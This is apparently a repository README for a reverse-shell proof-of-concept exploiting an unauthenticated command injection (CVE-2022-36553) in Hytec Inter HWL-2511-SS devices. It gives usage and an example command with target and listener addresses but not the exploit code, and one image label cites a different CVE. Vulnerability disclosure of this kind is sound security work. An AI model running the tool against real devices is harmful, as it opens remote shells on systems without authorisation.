# CVE-2022-36553 -  Hytec Inter HWL-2511-SS Unauthenticated Remote Command Injection.

## Overview
This repository contains a Proof of Concept (PoC) reverse shell script for exploiting CVE-2022-36553, a critical vulnerability in Hytec Inter HWL-2511-SS devices. The script is a practical demonstration, complementing the in-depth analysis provided in my blog post "Hytec Inter HWL-2511-SS - Vulnerability Report."

### Affected versions
All Hytec Inter HWL-2511-SS devices from version 1.05 and under.

### PoC Script Usage

```python
# Usage: python HWL-2511-SS.py --RHOST <Target-IP> --RPORT <Target-Port> --LHOST <Local-IP> --LPORT <Local-Port>
# Example: python HWL-2511-SS.py --RHOST 192.168.1.1 --RPORT 443 --LHOST 192.168.1.100 --LPORT 4444
```

 ### Video Proof of Concept

![Script PoC CVE-2022-26134](https://neroteam.com/blog/pages/hytec-inter-hwl-2511-ss-vulnerability-report/hytec-1.jpg?m=1673083022)

[![Hytec Inter HWL-2511-SS Unauthenticated Remote Command Injection](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://youtu.be/ILBJglgD-9U)

### Note
FOR EDUCATIONAL PURPOSE ONLY.
